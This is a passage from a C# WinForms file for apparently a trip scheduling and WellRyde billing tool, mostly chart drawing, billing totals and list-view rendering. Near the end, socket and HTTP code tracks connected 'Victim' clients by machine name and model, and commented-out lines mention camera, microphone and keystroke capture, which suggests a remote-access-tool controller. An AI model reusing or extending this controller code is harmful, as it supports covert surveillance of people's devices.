                    LoadingGifLabel.Text = text;
            }
            catch (ObjectDisposedException)
            {
                // ignore
            }
        }

        //charts
        private void ConfigureAccuracyChartLayout()
        {
            if (tcchart == null || tcchart.IsDisposed)
                return;

            ChartArea area = tcchart.ChartAreas["TCChartArea"];
            Series series = tcchart.Series["Accuracies"];

            area.BackColor = Color.FromArgb(80, 80, 80);
            area.Position.Auto = false;
            area.Position.X = 3f;
            area.Position.Y = 17f;
            area.Position.Width = 94f;
            area.Position.Height = 80f;

            area.InnerPlotPosition.Auto = false;
            area.InnerPlotPosition.X = 8f;
            area.InnerPlotPosition.Y = 4f;
            area.InnerPlotPosition.Width = 88f;
            area.InnerPlotPosition.Height = 82f;

            area.AxisX.LabelStyle.ForeColor = Color.White;
            area.AxisX.LabelStyle.Font = new Font("Segoe UI", 8.25f);
            area.AxisX.LabelStyle.Angle = 0;
            area.AxisX.LabelStyle.Interval = 1;
            area.AxisX.Interval = 1;
            area.AxisX.IsMarginVisible = true;
            area.AxisX.IsLabelAutoFit = true;
            area.AxisX.LabelAutoFitStyle = LabelAutoFitStyles.DecreaseFont;
            area.AxisX.LineColor = Color.White;
            area.AxisX.MajorGrid.Enabled = false;
            area.AxisX.TitleForeColor = Color.White;

            // Headroom above 100% bars so Outside labels clear the bar tops.
            area.AxisY.Minimum = 0;
            area.AxisY.Maximum = 115;
            area.AxisY.Interval = 20;
            area.AxisY.IsStartedFromZero = true;
            area.AxisY.LabelStyle.ForeColor = Color.White;
            area.AxisY.LineColor = Color.White;
            area.AxisY.MajorGrid.LineColor = Color.FromArgb(95, 95, 95);
            area.AxisY.TitleForeColor = Color.White;

            series.ChartType = SeriesChartType.Column;
            series.IsValueShownAsLabel = true;
            series.Font = new Font("Segoe UI", 8.25f, FontStyle.Bold);
            series.LabelForeColor = Color.White;
            series["PointWidth"] = "0.62";
            series["BarLabelStyle"] = "Outside";
            series.SmartLabelStyle.Enabled = false;
        }

        private void DrawAccuracyChart(List<MCDriver> driverslist)
        {
            ConfigureAccuracyChartLayout();

            ChartArea area = tcchart.ChartAreas["TCChartArea"];
            Series series = tcchart.Series["Accuracies"];
            series.Points.Clear();
            area.AxisY.StripLines.Clear();

            StripLine stripline = new StripLine
            {
                IntervalOffset = 70,
                StripWidth = 1,
                BackColor = Color.Orange,
            };
            area.AxisY.StripLines.Add(stripline);

            int point = 0;
            foreach (MCDriver driver in driverslist)
            {
                double pct = driver.AccuracyPercent;
                if (pct < 0)
                    pct = 0;
                if (pct > 100)
                    pct = 100;

                series.Points.Add(pct);

                if ((int)pct > 70)
                    series.Points[point].Color = Color.ForestGreen;
                else
                    series.Points[point].Color = Color.DarkRed;

                series.Points[point].LabelForeColor = Color.White;
                series.Points[point].AxisLabel = SplitDriverName(driver.Driver);
                series.Points[point].LegendText = "...";
                series.Points[point].Label = pct.ToString("0") + "%";
                series.Points[point]["BarLabelStyle"] = "Outside";
                point++;
            }

            tcchart.Invalidate();
        }
        private static decimal SumBillableTripAmounts(IEnumerable<BillableTrip> trips)
        {
            decimal total = 0;
            if (trips == null)
                return 0;
            foreach (BillableTrip trip in trips)
            {
                if (!string.IsNullOrEmpty(trip.billedAmount))
                    total += Convert.ToDecimal(trip.billedAmount);
            }
            return Math.Round(total, 2, MidpointRounding.AwayFromZero);
        }

        private string BuildBillingSubmitStatusMessage(int confirmedOnPortal)
        {
            if (_lastBillingSubmitCount <= 0)
                return "Status: No trips were submitted.";
            if (confirmedOnPortal >= _lastBillingSubmitCount)
                return "Status: Submitted " + _lastBillingSubmitCount + " trips ($" + _lastBillingSubmitDollars.ToString("N2")
                    + "). All confirmed Billed on WellRyde.";
            return "Status: Submitted " + _lastBillingSubmitCount + " trips ($" + _lastBillingSubmitDollars.ToString("N2")
                + "). Portal confirmed " + confirmedOnPortal + " / " + _lastBillingSubmitCount + " as Billed (refreshing…).";
        }

        private void SetBillingStatusLabel(string text)
        {
            if (_applicationExitRequested || IsDisposed || billingstatuslbl == null)
                return;
            void apply()
            {
                if (!billingstatuslbl.IsDisposed)
                    billingstatuslbl.Text = text ?? string.Empty;
            }
            if (billingstatuslbl.InvokeRequired)
                billingstatuslbl.BeginInvoke((MethodInvoker)apply);
            else
                apply();
        }

        private void RunOnUiThread(Action action)
        {
            if (_applicationExitRequested || IsDisposed || action == null)
                return;
            if (InvokeRequired)
                BeginInvoke(action);
            else
                action();
        }

        private void RefreshBillingCharts()
        {
            if (wrBillingTool?.WRCalculations == null)
                return;

            int billableCount = wrBillingTool.WRCalculations.CalculateBillableTripCount(billingmmcb.CheckState, billingallcb.CheckState);
            decimal billableDollars = Math.Round(
                wrBillingTool.WRCalculations.CalculateActualBillTotal(billingmmcb.CheckState, billingallcb.CheckState),
                2,
                MidpointRounding.AwayFromZero);
            int billedCount = wrBillingTool.WRCalculations.CountBilledTrips();
            decimal billedDollars = Math.Round(wrBillingTool.WRCalculations.CalculateBilledTotal(), 2, MidpointRounding.AwayFromZero);

            var billableByPrice = wrBillingTool.WRCalculations.CalculatePriceGroupsForBillableTrips(
                billingmmcb.CheckState, billingallcb.CheckState);
            var billedByPrice = wrBillingTool.WRCalculations.CalculateBillablePriceGroups();

            DrawBillableVsLossesChart(billableDollars, billableCount, billedDollars, billedCount);
            DrawBillingPriceGroupChart(billableByPrice, billedByPrice);
        }

        private void DrawBillableVsLossesChart(decimal billableDollars, int billableCount, decimal billedDollars, int billedCount)
        {
            string billableLabel = "$" + billableDollars.ToString("N2") + " (" + billableCount + ")";
            string billedLabel = "$" + billedDollars.ToString("N2") + " (" + billedCount + ")";










            incomevslosseschart.Series["Totals"].Points.Clear();
            incomevslosseschart.Series["Totals"].LabelForeColor = Color.White;


            incomevslosseschart.ChartAreas["ChartArea1"].AxisX.LabelStyle.ForeColor = Color.White;
            incomevslosseschart.ChartAreas["ChartArea1"].AxisY.LabelStyle.ForeColor = Color.White;

            incomevslosseschart.ChartAreas["ChartArea1"].Axes[0].LineColor = Color.White;
            incomevslosseschart.ChartAreas["ChartArea1"].Axes[1].LineColor = Color.White;

            incomevslosseschart.ChartAreas["ChartArea1"].AxisX.TitleForeColor = Color.White;
            incomevslosseschart.ChartAreas["ChartArea1"].AxisY.TitleForeColor = Color.White;

            incomevslosseschart.Series["Totals"].Points.Add(Convert.ToDouble(billableDollars));
            incomevslosseschart.Series["Totals"].Points[0].Color = Color.Green;
            incomevslosseschart.Series["Totals"].Points[0].LabelForeColor = Color.White;
            incomevslosseschart.Series["Totals"].Points[0].AxisLabel = "Billable";
            incomevslosseschart.Series["Totals"].Points[0].LegendText = "Billable";
            incomevslosseschart.Series["Totals"].Points[0].Label = billableLabel;

            incomevslosseschart.Series["Totals"].Points.Add(Convert.ToDouble(billedDollars));
            incomevslosseschart.Series["Totals"].Points[1].Color = Color.RoyalBlue;
            incomevslosseschart.Series["Totals"].Points[1].LabelForeColor = Color.White;
            incomevslosseschart.Series["Totals"].Points[1].AxisLabel = "Billed";
            incomevslosseschart.Series["Totals"].Points[1].LegendText = "Billed";
            incomevslosseschart.Series["Totals"].Points[1].Label = billedLabel;

            var totalsArea = incomevslosseschart.ChartAreas["ChartArea1"];
            totalsArea.AxisY.Minimum = 0;
            double yMax = Math.Max(Convert.ToDouble(billableDollars), Convert.ToDouble(billedDollars));
            if (yMax <= 0 && (billableCount > 0 || billedCount > 0))
                yMax = 1;
            totalsArea.AxisY.Maximum = yMax > 0 ? double.NaN : 1;
            incomevslosseschart.Invalidate();
        }

        private void EnsureBillingPriceGroupChartSeries()
        {
            if (pgchart == null)
                return;

            const string billableSeries = "Billable";
            const string billedSeries = "Billed";

            if (pgchart.Series.IndexOf(billableSeries) < 0)
            {
                if (pgchart.Series.IndexOf("Totals") >= 0)
                {
                    pgchart.Series["Totals"].Name = billableSeries;
                    pgchart.Series[billableSeries].LegendText = billableSeries;
                }
                else
                {
                    var s = new System.Windows.Forms.DataVisualization.Charting.Series(billableSeries)
                    {
                        ChartArea = "PGChartArea",
                        ChartType = System.Windows.Forms.DataVisualization.Charting.SeriesChartType.Column,
                        LegendText = billableSeries,
                    };
                    pgchart.Series.Add(s);
                }
            }

            if (pgchart.Series.IndexOf(billedSeries) < 0)
            {
                var s = new System.Windows.Forms.DataVisualization.Charting.Series(billedSeries)
                {
                    ChartArea = "PGChartArea",
                    ChartType = System.Windows.Forms.DataVisualization.Charting.SeriesChartType.Column,
                    LegendText = billedSeries,
                };
                pgchart.Series.Add(s);
            }
        }

        private void DrawBillingPriceGroupChart(
            IDictionary<decimal, int> billableByPrice,
            IDictionary<decimal, int> billedByPrice)
        {
            if (pgchart == null)
                return;

            EnsureBillingPriceGroupChartSeries();

            pgchart.Series["Billable"].Points.Clear();
            pgchart.Series["Billed"].Points.Clear();
            pgchart.Series["Billable"].LabelForeColor = Color.White;
            pgchart.Series["Billed"].LabelForeColor = Color.White;

            var pgArea = pgchart.ChartAreas["PGChartArea"];
            pgArea.AxisX.LabelStyle.ForeColor = Color.White;
            pgArea.AxisY.LabelStyle.ForeColor = Color.White;
            pgArea.Axes[0].LineColor = Color.White;
            pgArea.Axes[1].LineColor = Color.White;
            pgArea.AxisX.TitleForeColor = Color.White;
            pgArea.AxisY.TitleForeColor = Color.White;
            pgArea.AxisY.Minimum = 0;
            pgArea.AxisX.Interval = 1;

            var allPrices = new SortedSet<decimal>();
            if (billableByPrice != null)
            {
                foreach (decimal p in billableByPrice.Keys)
                    allPrices.Add(p);
            }
            if (billedByPrice != null)
            {
                foreach (decimal p in billedByPrice.Keys)
                    allPrices.Add(p);
            }

            int point = 0;
            foreach (decimal price in allPrices)
            {
                int billableCount = billableByPrice != null && billableByPrice.TryGetValue(price, out int b) ? b : 0;
                int billedCount = billedByPrice != null && billedByPrice.TryGetValue(price, out int b2) ? b2 : 0;
                string priceLabel = "$" + price.ToString("0.##");

                pgchart.Series["Billable"].Points.Add(billableCount);
                pgchart.Series["Billable"].Points[point].Color = Color.ForestGreen;
                pgchart.Series["Billable"].Points[point].LabelForeColor = Color.White;
                pgchart.Series["Billable"].Points[point].AxisLabel = priceLabel;
                pgchart.Series["Billable"].Points[point].LegendText = billableCount.ToString();
                pgchart.Series["Billable"].Points[point].Label = billableCount > 0 ? billableCount.ToString() : string.Empty;

                pgchart.Series["Billed"].Points.Add(billedCount);
                pgchart.Series["Billed"].Points[point].Color = Color.RoyalBlue;
                pgchart.Series["Billed"].Points[point].LabelForeColor = Color.White;
                pgchart.Series["Billed"].Points[point].AxisLabel = priceLabel;
                pgchart.Series["Billed"].Points[point].LegendText = billedCount.ToString();
                pgchart.Series["Billed"].Points[point].Label = billedCount > 0 ? billedCount.ToString() : string.Empty;

                point++;
            }

            pgchart.Invalidate();
        }




        //events
        private void tbcb_SelectedIndexChanged(object sender, EventArgs e)
        {
            tbtemplatenamecb.Items.Clear();
            templatelv.Items.Clear();
            if (hiatmeTabControl.SelectedTab == hiatmeTabControl.TabPages["tabPage5"])//your specific tabname
            {
                string s = (string)tbcb.Text;
                //Console.WriteLine(s);
                tbuilder.GetAvailibleTemplatesForDay(s);
                foreach (KeyValuePair<string, IDictionary<string, string[]>> drivertriplist in tbuilder.driverTripList)
                {
                    // do something with entry.Value or entry.Key

                    //  Console.WriteLine(drivertriplist.Key);
                    tbtemplatenamecb.Items.Add(drivertriplist.Key);
                    tbtemplatenamecb.SelectedIndex = 0;
                    // VerifyDriverTripsInfo(drivertriplist);
                }
            }
        }
        private void tbtemplatenamecb_SelectedIndexChanged(object sender, EventArgs e)
        {
            templatelv.Items.Clear();

            foreach (KeyValuePair<string, IDictionary<string, string[]>> drivertriplist in tbuilder.driverTripList)
            {
                //Console.WriteLine(drivertriplist.Key + " " + tbtemplatenamecb.Text);
                if (drivertriplist.Key == tbtemplatenamecb.Text)
                {
                    foreach (KeyValuePair<string, string[]> trip in drivertriplist.Value)
                    {
                        if (trip.Value != null && TripTemplateCsvValidator.IsTemplateGapRow(trip.Value))
                        {
                            templatelv.Items.Add(new ListViewItem(new[] { "", "", "", "", "", "", "", "", "", "", "", "", "", "" }));
                            continue;
                        }

                        ListViewItem lvi = new ListViewItem();
                        lvi.Text = trip.Value[0];
                        lvi.SubItems.Add(trip.Value[1]);
                        lvi.SubItems.Add(trip.Value[2]);
                        lvi.SubItems.Add(trip.Value[3]);
                        lvi.SubItems.Add(trip.Value[4]);
                        lvi.SubItems.Add(trip.Value[5]);
                        lvi.SubItems.Add(trip.Value[6]);
                        lvi.SubItems.Add(trip.Value[7]);
                        lvi.SubItems.Add(trip.Value[8]);
                        lvi.SubItems.Add(trip.Value[9]);
                        lvi.SubItems.Add(trip.Value[10]);
                        lvi.SubItems.Add(trip.Value[11]);
                        lvi.SubItems.Add(trip.Value[12]);

                        templatelv.Items.Add(lvi);
                    }
                }


                //Console.WriteLine(drivertriplist.Key);
                //tbtemplatenamecb.Items.Add(drivertriplist.Key);
                //tbtemplatenamecb.SelectedIndex = 0;
                // VerifyDriverTripsInfo(drivertriplist);
            }
            ListViewMinWidthEnforcer.ScheduleRecompute(templatelv);
        }
        private async void hiatmeTabControl_SelectedIndexChanged(object sender, EventArgs e)
        {
            try
            {
                if (hiatmeTabControl.SelectedTab == tabPage1)
                    pictureBox1?.Invalidate();
                if (hiatmeTabControl.SelectedTab == tabPage9 && tslv != null)
                {
                    ScheduleTripScoutColumnFit();
                    EnsureTripScoutFirstUseLoad();
                }
            }
            catch
            {
                // ignore
            }

            if (hiatmeTabControl.SelectedTab == hiatmeTabControl.TabPages["tabPage8"])
            {

                CreateEmployeeStatTable();
                
                //await Task.Delay(3000);
                
                
            }



                if (hiatmeTabControl.SelectedTab == hiatmeTabControl.TabPages["tabPage5"])//your specific tabname
            {
                tbtemplatenamecb.Items.Clear();
                tbstatuslbl.Text = "Status: To add or replace a template click 'ADD TEMPLATE' and choose a schedule. A template will be created for the week day of the selected schedule.";
                string s = (string)tbcb.Text;
                tbuilder.GetAvailibleTemplatesForDay(s);
                foreach (KeyValuePair<string, IDictionary<string, string[]>> drivertriplist in tbuilder.driverTripList)
                {
                    // do something with entry.Value or entry.Key
                    Console.WriteLine(drivertriplist.Key);
                    tbtemplatenamecb.Items.Add(drivertriplist.Key);
                    tbtemplatenamecb.SelectedIndex = 0;
                    // VerifyDriverTripsInfo(drivertriplist);
                }
            }
            if (hiatmeTabControl.SelectedTab == tabPage6)
                SetScheduleBuilderStatus("Ready. Pick a service date and click BUILD.");

        }
        private void listView_ColumnClick(object sender, ColumnClickEventArgs e)
        {

        }
        private void listView_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
            ListView listView = (ListView)sender;
            // Trip Scout and the Analyzer trip list share the polished SupeyTheme header palette.
            bool isTripScoutList = ReferenceEquals(listView, tslv) || ReferenceEquals(listView, aalv) || ReferenceEquals(listView, templatelv) || ReferenceEquals(listView, tctripcorrectlv) || ReferenceEquals(listView, tcbatchelinkslv);
            // Draw the standard header background.
            Color lvbg = isTripScoutList ? SupeyTheme.ListHeader : ColorTranslator.FromHtml("#333333");

            SolidBrush bluegrayBrush = new SolidBrush(lvbg);

            e.Graphics.FillRectangle(bluegrayBrush, e.Bounds);

            Rectangle rowBounds = e.Bounds;
            Rectangle bounds = new Rectangle(rowBounds.Left + 10, rowBounds.Top, Math.Max(0, rowBounds.Width - 10 - 1), rowBounds.Height);
            if (e.ColumnIndex == 0)
            {
                /*
               // listView.BeginUpdate();
                CheckBoxRenderer.DrawCheckBox(e.Graphics, new Point(e.Bounds.Left + 18, e.Bounds.Top + 7), 
                    false ? System.Windows.Forms.VisualStyles.CheckBoxState.CheckedNormal :
                    System.Windows.Forms.VisualStyles.CheckBoxState.UncheckedNormal);
                */
               // listView.EndUpdate();
                //CheckBoxRenderer.DrawCheckBox(e.Graphics, new Point(e.Bounds.Left + 18, e.Bounds.Top + 7), System.Windows.Forms.VisualStyles.CheckBoxState.UncheckedNormal);
            }
            // Draw the header text.
            TextFormatFlags align;
            switch (listView.Columns[e.ColumnIndex].TextAlign)
            {
                case HorizontalAlignment.Right:
                    align = TextFormatFlags.Right;
                    break;
                case HorizontalAlignment.Center:
                    align = TextFormatFlags.HorizontalCenter;
                    break;
                default:
                    align = TextFormatFlags.Left;
                    break;
            }
            TextRenderer.DrawText(e.Graphics, e.Header.Text, ListViewOwnerDrawFonts.Header, bounds,
                isTripScoutList ? SupeyTheme.ListHeaderText : Color.Gainsboro,
                align | TextFormatFlags.SingleLine | TextFormatFlags.GlyphOverhangPadding | TextFormatFlags.VerticalCenter | TextFormatFlags.WordEllipsis);

            // Faint divider on the right edge of every header cell so users see the resize grabber
            // (the flat #333333 fill above otherwise hides Windows' default column boundary).
            using (var dividerPen = new Pen(isTripScoutList ? SupeyTheme.ListGrid : Color.FromArgb(64, 255, 255, 255), 1f))
            {
                e.Graphics.DrawLine(dividerPen, e.Bounds.Right - 1, e.Bounds.Top + 4, e.Bounds.Right - 1, e.Bounds.Bottom - 4);
            }

            // Sort arrow indicator if this column is the active sort column on a ListViewSorter-equipped list.
            var sorter = listView.ListViewItemSorter as ListViewSorter;
            if (sorter != null && sorter.SortColumn == e.ColumnIndex && sorter.Order != SortOrder.None)
            {
                int cx = e.Bounds.Right - 16;
                int cy = e.Bounds.Top + (e.Bounds.Height / 2);
                Point[] tri = sorter.Order == SortOrder.Ascending
                    ? new[] { new Point(cx, cy + 3), new Point(cx + 8, cy + 3), new Point(cx + 4, cy - 3) }
                    : new[] { new Point(cx, cy - 3), new Point(cx + 8, cy - 3), new Point(cx + 4, cy + 3) };
                using (var arrowBrush = new SolidBrush(isTripScoutList ? SupeyTheme.ListHeaderText : Color.Gainsboro))
                {
                    e.Graphics.FillPolygon(arrowBrush, tri);
                }
            }

            return;
        }
        private void listView_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            ListView listView = (ListView)sender;
            // Trip Scout and the Analyzer trip list share the polished SupeyTheme selection highlight.
            bool isTripScoutList = ReferenceEquals(listView, tslv) || ReferenceEquals(listView, aalv) || ReferenceEquals(listView, templatelv) || ReferenceEquals(listView, tctripcorrectlv) || ReferenceEquals(listView, tcbatchelinkslv);
            if ((e.State & ListViewItemStates.Selected) != 0)
            {
                if (listView.Focused && e.Item.Selected)
                {

                    Rectangle R = e.Bounds;
                    R.Inflate(-1, -1);
                    using (Brush brush = new SolidBrush(isTripScoutList ? SupeyTheme.ListSelected : Color.RoyalBlue))
                    {
                        e.Graphics.FillRectangle(brush, R);
                    }
                    using (Pen pen = new Pen(isTripScoutList ? SupeyTheme.BorderSubtle : Color.Black, 1.5f))
                    {
                        e.Graphics.DrawRectangle(pen, R);
                    }
                }
                else
                {
                    e.DrawBackground();
                }
            }
            else
            {
                // Owner-draw suppresses the default item background, so paint the row's
                // BackColor ourselves — this is what shows the Analyzer's alert color coding.
                if (ReferenceEquals(listView, aalv))
                {
                    using (var rowBrush = new SolidBrush(e.Item.BackColor))
                        e.Graphics.FillRectangle(rowBrush, e.Bounds);
                }
            }

            // Draw the item text for views other than the Details view.
            if (listView.View != System.Windows.Forms.View.Details)
            {

                e.DrawText();
            }
            /*
            if (e.Item.Checked)

                ControlPaint.DrawCheckBox(e.Graphics, e.Bounds.Left + 18, e.Bounds.Top + 6, 15, 15, ButtonState.Checked);
            else
                ControlPaint.DrawCheckBox(e.Graphics, e.Bounds.Left + 18, e.Bounds.Top + 6, 15, 15, ButtonState.Flat);
            */
        }
        private void listView_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
        {
            ListView listView = (ListView)sender;
            bool isTripScoutList = ReferenceEquals(listView, tslv) || ReferenceEquals(listView, aalv) || ReferenceEquals(listView, templatelv) || ReferenceEquals(listView, tctripcorrectlv) || ReferenceEquals(listView, tcbatchelinkslv);

            Rectangle rowBounds = e.Bounds;
            Rectangle bounds = new Rectangle(rowBounds.Left + 10, rowBounds.Top, Math.Max(0, rowBounds.Width - 10 - 1), rowBounds.Height);

            TextFormatFlags align;
            switch (listView.Columns[e.ColumnIndex].TextAlign)
            {
                case HorizontalAlignment.Right:
                    align = TextFormatFlags.Right;
                    break;
                case HorizontalAlignment.Center:
                    align = TextFormatFlags.HorizontalCenter;
                    break;
                default:
                    align = TextFormatFlags.Left;
                    break;
            }
            bool selected = (e.ItemState & ListViewItemStates.Selected) != 0 && listView.Focused;
            Color textColor = isTripScoutList
                ? (selected ? SupeyTheme.ListSelectedText : SupeyTheme.ListText)
                : Color.White;
            TextRenderer.DrawText(e.Graphics, e.SubItem.Text, ListViewOwnerDrawFonts.Cell, bounds, textColor,
                align | TextFormatFlags.SingleLine | TextFormatFlags.GlyphOverhangPadding | TextFormatFlags.VerticalCenter | TextFormatFlags.WordEllipsis);
        }
        private void ListView_SizeChanged(object sender, EventArgs e)
        {
            billinglistview.Columns[13].Width = 500;
            //billinglistview.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
            //billinglistview.Columns[11].AutoResize(ColumnHeaderAutoResizeStyle.HeaderSize);

            int columnwidths = 0;
            ListView.ColumnHeaderCollection cc = billinglistview.Columns;
            for (int i = 0; i < cc.Count; i++)
            {
                ///Console.WriteLine(cc[i].Width);
                if (i < 11)
                {
                    columnwidths += cc[i].Width;
                }
                //billinglistview.Columns[11].Width = (billinglistview.Width - columnwidths);
                //Console.WriteLine(columnwidths);
                //int colWidth = TextRenderer.MeasureText(cc[i].Text, billinglistview.Font).Width + 10;

                //if (colWidth > cc[i].Width)
                //{
                    //cc[i].Width = colWidth;
                //}
            }


        }
        private void billinglistview_ColumnClick(object sender, ColumnClickEventArgs e)
        {

        }








        List<Victim> victim_list = new List<Victim>();

        public static int port_no = 8443;
        public static string PASSWORD = string.Empty;

        public static Socket oursocket = default;
        private const string IP = "127.0.0.1";

        public static HttpClient ServerHttpClient = new HttpClient { Timeout = TimeSpan.FromSeconds(15) };
        private System.Windows.Forms.Timer _clientListTimer;


        public async void Connect_Setup()
        {
            if (_applicationExitRequested)
                return;
            await Task.Run(async () =>
            {
                try
                {
                    if (_applicationExitRequested)
                        return;
                    if (_clientListTimer != null)
                    {
                        _clientListTimer.Stop();
                        _clientListTimer.Dispose();
                        _clientListTimer = null;
                    }
                    await FetchClientsListOnce();
                    if (_applicationExitRequested)
                        return;
                    _clientListTimer = new System.Windows.Forms.Timer();
                    _clientListTimer.Interval = 4000;
                    _clientListTimer.Tick += async (s, e) => await FetchClientsListOnce();
                    _clientListTimer.Start();
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex);
                    if (_applicationExitRequested)
                        return;
                    await Task.Delay(2000);
                    if (!_applicationExitRequested)
                        Connect_Setup();
                }
            });
        }

        private async Task FetchClientsListOnce()
        {
            if (_applicationExitRequested)
                return;
            try
            {
                var baseUrl = (MainValues.ServerApiBase ?? "http://localhost:3000").TrimEnd('/');
                var response = await ServerHttpClient.GetAsync(baseUrl + "/api/clients");
                response.EnsureSuccessStatusCode();
                var json = await response.Content.ReadAsStringAsync();
                var jo = JObject.Parse(json);
                var clientsArray = jo["clients"]?.ToString() ?? "[]";
                var arrstr = new[] { "RECCLIENTLIST", clientsArray };
                if (_applicationExitRequested || !IsHandleCreated || IsDisposed)
                    return;
                Invoke((MethodInvoker)delegate { ModifyClientListCheck(arrstr); });
            }
            catch (Exception ex)
            {
                Console.WriteLine("Fetch clients: " + ex.Message);
            }
        }

        public async void infoAl(Socket sckInf)
        {
            lock (_infoAlSocketsLock)
                _infoAlActiveSockets.Add(sckInf);
            try
            {
                NetworkStream networkStream = new NetworkStream(sckInf);
                System.Text.StringBuilder sb = new System.Text.StringBuilder();
                int thisRead = 0;
                int blockSize = 2048;
                byte[] dataByte = new byte[blockSize];
                while (!_applicationExitRequested)
                {
                    thisRead = await networkStream.ReadAsync(dataByte, 0, blockSize);
                    if (thisRead == 0)
                        break;
                    sb.Append(System.Text.Encoding.UTF8.GetString(dataByte, 0, thisRead));
                    sb = sb.Replace("[0x09]KNT[VERI][0x09]<EOF>", "");
                    while (sb.ToString().Trim().Contains("<EOF>"))
                    {
                        string veri = sb.ToString().Substring(sb.ToString().IndexOf("[0x09]"), sb.ToString().IndexOf("<EOF>") + 5);
                        Data_Coming_From_Our_Socket(veri.Replace("<EOF>", "").Replace("[0x09]KNT[VERI][0x09]", ""));
                        sb.Remove(sb.ToString().IndexOf("[0x09]"), sb.ToString().IndexOf("<EOF>") + 5);
                    }
                }
            }
            catch (Exception)
            {
                //Prev.global_cam.StopCamera(); key_gonder = false; micStop();
                //stopProjection(); Baglanti_Kur();
            }
            finally
            {
                lock (_infoAlSocketsLock)
                    _infoAlActiveSockets.Remove(sckInf);
            }
        }
        public async void sendToSocket(string tag, string mesaj)
        {
            try
            {
                //Console.WriteLine("boo");
                //Console.WriteLine(mesaj);
                using (NetworkStream ns = new NetworkStream(oursocket))
                {
                    byte[] cmd = System.Text.Encoding.UTF8.GetBytes("[0x09]" + tag + mesaj + $"<EOF{PASSWORD}>");
                    await ns.WriteAsync(cmd, 0, cmd.Length);
                }

            }
            catch (Exception) { }
        }
        public void SetSocketKeepAliveValues(Socket instance, int KeepAliveTime, int KeepAliveInterval)
        {
            //KeepAliveTime: default value is 2hr
            //KeepAliveInterval: default value is 1s and Detect 5 times

            //the native structure
            //struct tcp_keepalive {
            //ULONG onoff;
            //ULONG keepalivetime;
            //ULONG keepaliveinterval;
            //};

            int size = Marshal.SizeOf(new uint());
            byte[] inOptionValues = new byte[size * 3]; // 4 * 3 = 12
            bool OnOff = true;

            BitConverter.GetBytes((uint)(OnOff ? 1 : 0)).CopyTo(inOptionValues, 0);
            BitConverter.GetBytes((uint)KeepAliveTime).CopyTo(inOptionValues, size);
            BitConverter.GetBytes((uint)KeepAliveInterval).CopyTo(inOptionValues, size * 2);

            instance.IOControl(IOControlCode.KeepAliveValues, inOptionValues, null);
        }
        private async void RequestClientsList()
        {
            if (_applicationExitRequested)
                return;
            await Task.Run(async () =>
            {
                try
                {
                    if (_applicationExitRequested)
                        return;
                    if (oursocket != null)
                    {
                        sendToSocket("REQCLIENTLIST", "[VERI][0x09]");
                        //sendToSocket("REQCLIENTLIST", "[VERI]" + "Client id goes here" + "[VERI][0x09]");
                    }
                }
                catch (Exception ex)
                {
                    if (!_applicationExitRequested)
                        await Task.Delay(2000);
                }
            });
        }
        private void Data_Coming_From_Our_Socket(string data)
        {
            string[] _parts_ = data.Split(new[] { "[0x09]" }, StringSplitOptions.None);
            foreach (string str in _parts_)
            {
                string[] separator = str.Split(new[] { "[VERI]" }, StringSplitOptions.None);
                try
                {             
                    switch (separator[0])
                    {
                        case "RECCLIENTLIST":
                            // MessageBox.Show(separator[1]);
                            Console.WriteLine("Recieved client list");
                            //Console.WriteLine(separator[1]);
                            ModifyClientListCheck(separator);
                            break;
                        case "TEST":
                            break;

                    }
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Error: {ex}");
                }
            }
        }
        private async void ModifyClientListCheck(string[] arrstr)
        {
            await Task.Run(async () =>
            {
                try
                {
                    Invoke((MethodInvoker)delegate
                    {
                        // deal with clients in listview

                        StringBuilder sb = new StringBuilder();

                        if (arrstr != null && arrstr.Length > 1)
                        {
                            List<Victim> victimlist = JsonConvert.DeserializeObject<List<Victim>>(arrstr[1]);

                            foreach (Victim vic in victimlist)
                            {
                                string clientid = string.Empty;
                                foreach (ListViewItem lvi in listView1.Items)
                                {
                                    if (lvi.Text == vic.id)
                                    {
                                        clientid = vic.id;
                                    }
                                }

                                if (clientid == string.Empty)
                                {
                                    bool clientfound = false;
                                    foreach (Victim victim in victim_list)
                                    {
                                        //victimcopy = victim;
                                        if (victim.id == vic.id)
                                        {
                                            clientfound = true;
                                        }
                                    }
                                    if (!clientfound)
                                    {
                                        Add_Client(vic.soket ?? oursocket, vic.id, vic.pcname, vic.language, vic.model, vic.version);
                                        listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + vic.id);
                                    }
                                }
                            }

                            victim_list = victimlist;

                            foreach (ListViewItem lvi in listView1.Items)
                            {
                                bool clientfound = false;

                                foreach (Victim victim in victim_list)
                                {
                                    if (lvi.Text == victim.id)
                                    {
                                        clientfound = true;
                                    }
                                }

                                if (!clientfound)
                                {
                                    listView1.Items.Remove(lvi);
                                }
                            }

                            /*

                            for (int i = 1; i < arrstr.Length; i++)
                            {
                                string clientid = string.Empty;
                                sb.Append("[VERI]" + arrstr[i]);
                                if (listView1.Items.Count > 0)
                                {
                                    foreach (ListViewItem lvi in listView1.Items)
                                    {
                                        if (lvi.Text == arrstr[i])
                                        {
                                            clientid = arrstr[i];
                                        }
                                    }
                                    //clientid = listView1.Items.Cast<ListViewItem>().Where(y => y.Text == arrstr[i]).DefaultIfEmpty().First().SubItems[0].Text;
                                }
                                if (clientid == string.Empty)
                                {
                                    bool clientfound = false;
                                    foreach (Victim victim in victim_list)
                                    {
                                        //victimcopy = victim;
                                        if (victim.id == arrstr[i])
                                        {
                                            clientfound = true;
                                        }
                                    }
                                    if (!clientfound)
                                    {
                                        //list.Add(victimcopy);
                                        Add_Client(oursocket, arrstr[i], "soon", "soon", "soon", "22/22");
                                        listBox1.Items.Add("[" + DateTime.Now.ToString("HH:mm:ss") + "]" + arrstr[i]);
                                    }
                                }
                            }
                        }

                        Console.WriteLine(sb.ToString());

                        if (arrstr.Length > 2)
                        {
                            List<Victim> newlist = new List<Victim>();
                            foreach (Victim victim in victim_list)
                            {
                                for (int i = 1; i < arrstr.Length; i++)
                                {
                                    if (victim.id == arrstr[i])
                                    {
                                        newlist.Add(victim);
                                    }
                                }
                            }
                            victim_list = newlist;
                        }

                            foreach (ListViewItem lvi in listView1.Items)
                            {
                            bool clientfound = false;

                            foreach (Victim victim in victim_list)
                            {
                                if (lvi.Text == victim.id)
                                {
                                    clientfound = true;
                                }
                            }

